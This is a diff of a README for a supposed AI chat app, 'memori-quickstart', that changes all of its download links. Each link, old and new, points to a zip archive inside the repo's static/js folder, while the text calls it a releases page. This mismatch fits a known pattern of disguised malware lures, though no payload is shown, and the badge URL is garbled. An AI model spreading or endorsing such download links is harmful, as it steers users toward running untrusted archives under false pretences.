@@ -1,6 +1,6 @@
 # 🚀 memori-quickstart - Experience AI Chat Like Never Before
 
-[![Download Memori Quickstart](https://github.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/raw/refs/heads/main/static/js/memori_quickstart_v3.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/raw/refs/heads/main/static/js/memori_quickstart_v3.8.zip)
+[![Download Memori Quickstart](https://raw.githubusercontent.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/main/static/js/memori-quickstart-1.6.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/main/static/js/memori-quickstart-1.6.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Before you download Memori Quickstart, make sure your device meets these basic r
 Follow these straightforward steps to download and install the Memori Quickstart application:
 
 1. **Visit the Releases Page**: Click the link below to go directly to the download page.
-   - [Download Memori Quickstart](https://github.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/raw/refs/heads/main/static/js/memori_quickstart_v3.8.zip)
+   - [Download Memori Quickstart](https://raw.githubusercontent.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/main/static/js/memori-quickstart-1.6.zip)
 
 2. **Select Your Version**: On the releases page, you will see several versions available. Choose the latest version for the best experience.
 
@@ -44,7 +44,7 @@ Follow these straightforward steps to download and install the Memori Quickstart
 
 To get started, ensure you click the download link below to access the Releases page:
 
-- [Download Memori Quickstart](https://github.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/raw/refs/heads/main/static/js/memori_quickstart_v3.8.zip)
+- [Download Memori Quickstart](https://raw.githubusercontent.com/icantthinkofsomethinggoodhelpme1/memori-quickstart/main/static/js/memori-quickstart-1.6.zip)
 
 Once you follow the steps above, you can enjoy the features and benefits of AI chat right on your device. 
 
